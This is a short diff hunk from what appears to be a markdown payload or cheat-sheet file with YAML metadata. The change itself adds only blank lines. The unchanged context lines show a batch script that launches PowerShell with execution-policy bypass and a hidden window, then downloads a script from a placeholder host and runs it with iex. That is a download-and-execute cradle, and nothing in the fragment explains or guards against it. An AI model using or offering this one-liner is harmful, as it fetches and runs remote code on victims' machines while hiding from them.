@@ -13,3 +13,5 @@ updated_at: '2023-05-29T16:48:53.365139+00:00'
 @ECHO OFF
 powershell.exe -ep bypass -windowstyle hidden "iex(New-Object Net.WebClient).downloadString('http://$_TARGET_IP/$_SCRIPT.ps1')"
 ```
+
+
